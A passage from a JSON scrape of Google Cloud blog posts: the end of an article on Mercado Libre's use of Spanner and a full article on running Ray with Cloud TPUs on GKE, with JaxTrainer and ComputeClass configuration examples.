style=\"vertical-align: baseline;\">While Spanner isn't Mercado Libre's default backend for typical key-value workloads, there are specific applications running large scale </span><span style=\"vertical-align: baseline;\">non-relational, KV-style workloads</span><span style=\"vertical-align: baseline;\"> on the Spanner.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">Spanner’s foundational architecture — TrueTime for global consistency and automated sharding for effortless scaling — makes it an ideal candidate to reliably serve both these access patterns through the Fury platform.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Handling peak demand</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Mercado Libre's Spanner instances demonstrate significant processing capacity, handling around </span><strong style=\"vertical-align: baseline;\">214K </strong><span style=\"vertical-align: baseline;\">queries per second</span><strong style=\"vertical-align: baseline;\"> (QPS)</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">30K </strong><span style=\"vertical-align: baseline;\">transactions per second </span><strong style=\"vertical-align: baseline;\">(TPS)</strong><span style=\"vertical-align: baseline;\">. To manage this substantial workload, the Spanner infrastructure dynamically scales to over </span><strong style=\"vertical-align: baseline;\">400 nodes (by 30%)</strong><span style=\"vertical-align: baseline;\">, highlighting the robust and elastic nature of the underlying system in accommodating high-demand scenarios. This level of throughput and scalability is critical for maintaining the performance and reliability of Mercado Libre's services during its busiest times.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_ZAe7FJs.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Fig. 2 - Diagram of the solution built with Spanner, which uses current search data to predict and recommend products that a customer is most likely to purchase.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Turning data into action</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Mercado Libre builds a dynamic data ecosystem around Spanner, leveraging advanced analytics to feed insights directly back into operational systems.</span></p>\n<p><span style=\"vertical-align: baseline;\">They achieve real-time analytics by combining Spanner Data Boost with BigQuery Federation. Data Boost isolates analytical queries, preventing them from impacting critical transactional performance. This allows for powerful, large-scale analytics to run directly on fresh Spanner data within BigQuery, integrating seamlessly with other data sources.</span></p>\n<p><span style=\"vertical-align: baseline;\">Insights from BigQuery, such as customer segmentations or fraud scores, are then actioned via Reverse ETL, feeding directly back into Spanner. This enriches operational data, enabling immediate action by frontline applications like serving personalized content or performing real-time risk assessments.</span></p>\n<p><span style=\"vertical-align: baseline;\">Furthermore, Spanner Change Streams coupled with Dataflow drive crucial service integrations. By capturing real-time data modifications from Spanner, they establish robust pipelines. These enable loading changes into BigQuery for analytics or streaming them to services like Fury Stream for real-time consumption, ensuring low-latency data propagation and enabling event-driven architectures across their systems.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The impact: cost savings, agility, and future-proofing</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The strategic adoption of Spanner, amplified by internal platforms like Fury and sophisticated data workflows, has yielded significant benefits for Mercado Libre:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Significant cost savings &amp; low total cost of ownership:</strong><span style=\"vertical-align: baseline;\"> The combination of Spanner's managed nature (reducing manual sharding, maintenance, and maintenance work), efficient resource utilization, and the abstraction provided by Fury has led to a lower Total Cost of Ownership and substantial cost savings.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Business impact &amp; agility:</strong><span style=\"vertical-align: baseline;\"> Developers, freed from infrastructure complexities by Fury and empowered by Spanner's versatile capabilities, can deliver new features and applications faster. The reliability of Spanner underpins critical business operations, minimizing disruptions.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Low operational overhead:</strong><span style=\"vertical-align: baseline;\"> Automated scaling, sharding, and maintenance in Spanner significantly reduce the human effort required to manage large-scale database infrastructure.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Building for AI:  Next-generation applications on Spanner</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Looking ahead, Mercado Libre is exploring Spanner to support more AI workloads.</span></p>\n<p><span style=\"vertical-align: baseline;\">Spanner's characteristics make it an ideal foundation:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Consistent state management:</strong><span style=\"vertical-align: baseline;\"> Critical for AI systems that need to maintain and reliably update their state context.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Scalable memory/knowledge store:</strong><span style=\"vertical-align: baseline;\"> Ability to store and retrieve vast amounts of data for AI system memory, logs, and contextual information.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Transactional operations:</strong><span style=\"vertical-align: baseline;\"> Enabling AI systems to perform reliable actions that interact with other systems.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Integration with analytics &amp; Machine Learning (ML):</strong><span style=\"vertical-align: baseline;\"> The existing data loops and ML.PREDICT capabilities can enrich AI systems with real-time insights and intelligence.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Spanner provides the transactional foundation  these sophisticated, AI applications will require.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Conclusion: A Unified, Intelligent Data Foundation</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Mercado Libre's adoption of Spanner demonstrates how to use a powerful, globally consistent database not just for its core capabilities, but as a strategic enabler for developer productivity, operational efficiency, advanced analytics, and future AI ambitions. Through their Fury platform, they've simplified access to Spanner's capabilities, allowing it to serve as a flexible foundation for both relational and non-relational needs. The integration with BigQuery via Data Boost demonstrates a comprehensive approach to building an intelligent, data-driven enterprise. As Mercado Libre builds AI applications, Spanner is set to continue its role as the consistent and scalable foundation for their next wave of innovation.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Learn more</strong></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/spanner\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Discover how Spanner can transform your business</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/spanner/docs/free-trial-quickstart\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Get started on Spanner today with a 90 day free trial instance.</span></a></p>\n</li>\n</ul></div>",
        "published_date": "2025-11-03 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/containers-kubernetes/ray-on-tpus-with-gke-a-more-native-experience/",
        "title": "A more native experience for Cloud TPUs with Ray on GKE",
        "thumbnail": null,
        "author": "Ryan O'Leary",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Engineering teams use Ray to scale AI workloads across a wide range of hardware, including both GPUs and Cloud TPUs. While Ray provides the core scaling capabilities, developers have often managed the unique architectural details of each accelerator. For Cloud TPUs, this included its specific networking model and Single Programming Multiple Data (SPMD) programming style. </span></p>\n<p><span style=\"vertical-align: baseline;\">As part of </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/partnering-with-anyscale-to-integrate-rayturbo-with-gke?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">our partnership with Anyscale</span></a><span style=\"vertical-align: baseline;\">, we are working on reducing the engineering effort to get started with TPUs on Google Kubernetes Engine (GKE). Our goal is to make the Ray experience on TPUs as native and low-friction as possible.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we are launching several key improvements that help make that possible.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Ray TPU Library for improved TPU awareness and scaling in Ray Core</strong></h3>\n<p><span style=\"vertical-align: baseline;\">TPUs have a unique architecture and a specific programming style called SPMD. Large AI jobs run on a TPU slice, which is a collection of chips connected by high-speed networking called interchip interconnect (ICI).</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_oDu45Si.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Previously, you needed to manually configure Ray to be aware of this specific hardware topology. This was a major setup step, and if done incorrectly, jobs could get fragmented resources from different, unconnected slices, causing severe performance bottlenecks.</span></p>\n<p><span style=\"vertical-align: baseline;\">This new library, </span><code style=\"vertical-align: baseline;\">ray.util.tpu</code><span style=\"vertical-align: baseline;\">, abstracts away these hardware details. It uses a feature called </span><code style=\"vertical-align: baseline;\">SlicePlacementGroup</code><span style=\"vertical-align: baseline;\"> along with the new </span><code style=\"vertical-align: baseline;\">label_selector</code><span style=\"vertical-align: baseline;\"> API to automatically reserve the entire, co-located TPU slice as one atomic unit. This guarantees the job runs on unified hardware, preventing performance issues from fragmentation. Because Ray couldn't guarantee this single-slice atomicity before, building reliable true multi-slice training (which intentionally spans multiple unique slices) was impossible. This new API also provides the critical foundation for Ray users to use Multislice technology to scale using multiple TPU slices.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Expanded support for Jax, Ray Train and Ray Serve </strong></h3>\n<p><span style=\"vertical-align: baseline;\">Our developments cover both training and inference. For training, Ray Train now offers alpha support for JAX (via </span><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/tutorials/distributed-training-tpu\"><span style=\"text-decoration: underline; vertical-align: baseline;\">JaxTrainer</span></a><span style=\"vertical-align: baseline;\">) and PyTorch on TPUs.</span></p>\n<p><span style=\"vertical-align: baseline;\">The </span><code style=\"vertical-align: baseline;\">JaxTrainer</code><span style=\"vertical-align: baseline;\"> API simplifies running JAX workloads on multi-host TPUs. It now automatically handles the complex distributed host initialization. As shown in the code example below, you only need to define your hardware needs—like the number of workers, topology, and accelerator type—within a simple </span><code style=\"vertical-align: baseline;\">ScalingConfig</code><span style=\"vertical-align: baseline;\"> object. The </span><code style=\"vertical-align: baseline;\">JaxTrainer</code><span style=\"vertical-align: baseline;\"> takes care of the rest.</span></p>\n<p><span style=\"vertical-align: baseline;\">This is a significant improvement because it solves a critical performance problem: resource fragmentation. Previously, a job requesting a \"4x4\" topology (which must run on a single co-located hardware unit called a slice) could instead receive fragmented resources—for example, eight chips from one physical slice and eight chips from a different, unconnected slice. This fragmentation was a major bottleneck, as it prevented the workload from using the high-speed ICI interconnect that only exists within a single, unified slice.</span></p>\n<p><span style=\"vertical-align: baseline;\">Example of how the JaxTrainer simplifies training on multi-host TPU:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;import jax\\r\\nimport jax.numpy as jnp\\r\\nimport optax\\r\\nimport ray.train\\r\\n\\r\\nfrom ray.train.v2.jax import JaxTrainer\\r\\nfrom ray.train import ScalingConfig\\r\\n\\r\\ndef train_func():\\r\\n&quot;&quot;&quot;This function is run on each distributed worker.&quot;&quot;&quot;\\r\\n...\\r\\n\\r\\n# Define the hardware configuration for your distributed job.\\r\\nscaling_config = ScalingConfig(\\r\\nnum_workers=4,\\r\\nuse_tpu=True,\\r\\ntopology=&quot;4x4&quot;,\\r\\naccelerator_type=&quot;TPU-V6E&quot;,\\r\\nplacement_strategy=&quot;SPREAD&quot;\\r\\n)\\r\\n\\r\\n# Define and run the JaxTrainer.\\r\\ntrainer = JaxTrainer(\\r\\ntrain_loop_per_worker=train_func,\\r\\nscaling_config=scaling_config,\\r\\n)\\r\\nresult = trainer.fit()\\r\\nprint(f&quot;Training finished on TPU v6e 4x4 slice&quot;)&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe168097250&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Ray Serve APIs support TPUs and with the improvements we have made to </span><a href=\"https://blog.vllm.ai/2025/10/16/vllm-tpu.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vLLM TPU</span></a><span style=\"vertical-align: baseline;\">, you can continue to use Ray on vLLM when moving to TPUs. This allows you to use the same stack you use on GPUs and run it on TPUs with minimal code changes.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Label-based Scheduling API for easy obtainability</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The new </span><a href=\"https://www.anyscale.com/blog/introducing-label-selectors-scheduling-ray\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Label-Based Scheduling API</span></a><span style=\"vertical-align: baseline;\"> integrates with </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/introducing-new-gke-custom-compute-class-api/\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">GKE</strong><span style=\"text-decoration: underline; vertical-align: baseline;\"> </span><strong style=\"text-decoration: underline; vertical-align: baseline;\">custom compute classes</strong></a><span style=\"vertical-align: baseline;\">. A custom compute class is a simple way to define a named hardware configuration. For example, you can create a class called </span><code style=\"vertical-align: baseline;\">cost-optimized</code><span style=\"vertical-align: baseline;\"> that tells GKE to try acquiring a Spot instance first, then fall back to a </span><a href=\"https://cloud.google.com/products/dws/pricing?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dynamic Workload Scheduler</span></a><span style=\"vertical-align: baseline;\"> FlexStart instance, and finally to a reserved instance as a last resort. The new Ray API lets you use classes directly from Python. With a simple </span><code style=\"vertical-align: baseline;\">label_selector</code><span style=\"vertical-align: baseline;\">, you can request hardware like \"TPU-V6E\" or target your </span><code style=\"vertical-align: baseline;\">cost-optimized</code><span style=\"vertical-align: baseline;\"> class, all without managing separate YAML files.</span></p>\n<p><span style=\"vertical-align: baseline;\">This same </span><code style=\"vertical-align: baseline;\">label_selector </code><span style=\"vertical-align: baseline;\">mechanism also exposes deep hardware control for TPUs. As GKE provisions the TPU pods for a slice, it injects metadata (like worker rank and topology) into each one. KubeRay (which manages Ray on GKE) then reads this GKE-provided metadata and automatically translates it into Ray-specific labels as it creates the nodes. This provides key information like the TPU generation (ray.io/accelerator-type), the physical chip topology (ray.io/tpu-topology), and the worker rank within the slice (</span><span style=\"vertical-align: baseline;\">ray.io/tpu-worker-id</span><span style=\"vertical-align: baseline;\">).</span></p>\n<p><span style=\"vertical-align: baseline;\">These node labels let you use a Ray label_selector to pin SPMD workloads to specific, co-located hardware, such as a \"4x4\" topology or a particular worker rank.</span></p>\n<p><span style=\"vertical-align: baseline;\">In the example below, a Ray user can request a v6e-32 TPU slice but instruct GKE to use custom compute classes to fallback to v5e-16 if that’s not available. Similarly, the user could start by requesting spot or DWS resources and if not available, fallback to reservation instances. </span></p>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Developers select compute and nodepools</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Platform Admins set up Kubernetes </span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">@ray.remote(num_cpu=1,<br /></span><span style=\"vertical-align: baseline;\">  label_selector={<br /></span><span style=\"vertical-align: baseline;\">   \"ray.io/tpu-pod-type\": \"v6e-32\",</span><span style=\"vertical-align: baseline;\">    “gke-flex-start”: “true”,<br /></span><span style=\"vertical-align: baseline;\">  },<br /></span><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\"> fallback_strategy</strong><span style=\"vertical-align: baseline;\">=[<br /></span><span style=\"vertical-align: baseline;\">    {\"label_selector\": {<br /></span><span style=\"vertical-align: baseline;\">      \"ray.io/tpu-pod-type\": \"v5litepod-16\",</span><span style=\"vertical-align: baseline;\">      <br /><span style=\"vertical-align: baseline;\">      </span>“reservation-name”: “</span><strong style=\"vertical-align: baseline;\">v5e-reservation</strong><span style=\"vertical-align: baseline;\">”,<br /></span><span style=\"vertical-align: baseline;\">      }<br /></span><span style=\"vertical-align: baseline;\">    },<br /></span><span style=\"vertical-align: baseline;\">  ]<br /></span><span style=\"vertical-align: baseline;\">)<br /></span><span style=\"vertical-align: baseline;\">def tpu_task():<br /></span><span style=\"vertical-align: baseline;\">  # Attempts to run on a node in a v6e 4x8<br /></span><span style=\"vertical-align: baseline;\">  # TPU slice, falling back to a node in a<br /></span><span style=\"vertical-align: baseline;\">  # v5e 4x4 TPU if v6e is unavailable.</span><span style=\"vertical-align: baseline;\"> <br />…</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">apiVersion: cloud.google.com/v1<br /></span><span style=\"vertical-align: baseline;\">kind: ComputeClass<br /></span><span style=\"vertical-align: baseline;\">metadata:<br /></span><span style=\"vertical-align: baseline;\">  name: cost-optimized<br /></span><span style=\"vertical-align: baseline;\">spec:<br /></span><span style=\"vertical-align: baseline;\">  priorities:<br /></span><span style=\"vertical-align: baseline;\">  - flexStart:<br /></span><span style=\"vertical-align: baseline;\">      enabled: true<br /></span><span style=\"vertical-align: baseline;\">    tpu:<br /></span><span style=\"vertical-align: baseline;\">      type: tpu-v6e-slice<br /></span><span style=\"vertical-align: baseline;\">      count: 8<br /></span><span style=\"vertical-align: baseline;\">      topology: 4x8</span><span style=\"vertical-align: baseline;\">  </span></p>\n<p><span style=\"vertical-align: baseline;\">  - tpu:<br /></span><span style=\"vertical-align: baseline;\">      type: tpu-v5-lite-podslice<br /></span><span style=\"vertical-align: baseline;\">     count: 4<br /></span><span style=\"vertical-align: baseline;\">      topology: 4x4<br /></span><span style=\"vertical-align: baseline;\">    reservations:<br /></span><span style=\"vertical-align: baseline;\">      specific:<br /></span><span style=\"vertical-align: baseline;\">        - name: </span><strong style=\"vertical-align: baseline;\">v5e-reservation<br /></strong><span style=\"vertical-align: baseline;\">        - affinity: Specific</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<h3><strong style=\"vertical-align: baseline;\">TPU metrics and logs in one place</strong></h3>\n<p><span style=\"vertical-align: baseline;\">You can now see key TPU performance metrics, like TensorCore utilization, duty cycle, High-Bandwidth Memory (HBM) usage, and memory bandwidth utilization, directly in the Ray Dashboard. We’ve also added low-level </span><code style=\"vertical-align: baseline;\">libtpu</code><span style=\"vertical-align: baseline;\"> logs. This makes debugging much faster, as you can immediately check if a failure is caused by the code or by the TPU hardware itself. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Together, these updates are a significant step toward making TPUs a seamless part of the Ray ecosystem. They make adapting your existing Ray applications between GPUs and TPUs a much more straightforward process. Here’s how to learn more and get started:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Review the documentation:</strong><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://docs.ray.io/en/latest/cluster/kubernetes/user-guides/tpu.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Use TPUs with Kuberay</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">JAX Workloads:</strong><span style=\"vertical-align: baseline;\"> See the new </span><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/tutorials/distributed-training-tpu\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Get Started with JAX guide</span></a><span style=\"vertical-align: baseline;\"> for using the JaxTrainer and </span><a href=\"https://docs.ray.io/en/master/train/getting-started-jax.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">learn more about JaxTrain</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">TPU metrics: </strong><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/add-on/ray-on-gke/how-to/view-tpu-metrics\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">View TPU metrics</span></a><span style=\"vertical-align: baseline;\"> in Ray Dashboard or Grafana</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Request TPU capacity:</strong><span style=\"vertical-align: baseline;\"> Get started quickly with </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/dws-flex-start-training-tpu\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">DWS Flex Start</strong><span style=\"text-decoration: underline; vertical-align: baseline;\"> for TPUs</span></a><span style=\"vertical-align: baseline;\">, which provides access to TPUs for jobs that run for less than 7 days.</span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\">Related Content: </span><a href=\"https://jax-ml.github.io/scaling-book/index\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Intro to TPUs</span></a></li>\n</ol></div>\n<div class=\"block-related_article_tout\">\n\n\n\n\n\n<div class=\"uni-related-article-tout h-c-page\">\n  <section class=\"h-c-grid\">\n    <a class=\"uni-related-article-tout__wrapper h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n        h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3 uni-click-tracker\" href=\"https://cloud.google.com/blog/products/containers-kubernetes/ray-on-gke-new-features-for-ai-scheduling-and-scaling/\">\n      <div class=\"uni-related-article-tout__inner-wrapper\">\n        <p class=\"uni-related-article-tout__eyebrow h-c-eyebrow\">Related Article</p>\n\n        <div class=\"uni-related-article-tout__content-wrapper\">\n          <div class=\"uni-related-article-tout__image-wrapper\">\n            <div class=\"uni-related-article-tout__image\"></div>\n          </div>\n          <div class=\"uni-related-article-tout__content\">\n            <h4 class=\"uni-related-article-tout__header h-has-bottom-margin\">Evolving Ray and Kubernetes together for the future of distributed AI and ML</h4>\n            <p class=\"uni-related-article-tout__body\">Ray on Kubernetes now has new label-based scheduling, DRA for accelerators, writable cgroups, and vertical pod resizing for distributed A...</p>\n            <div class=\"cta module-cta h-c-copy  uni-related-article-tout__cta muted\">\n              <span class=\"nowrap\">Read Article\n                <svg class=\"icon h-c-icon\" xmlns=\"http://www.w3.org/2000/svg\">\n                  <use xlink:href=\"#mi-arrow-forward\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n                </svg>\n              </span>\n            </div>\n          </div>\n        </div>\n      </div>\n    </a>\n  </section>\n</div>\n\n</div>",
        "published_date": "2025-11-03 17:00:00"
    }
]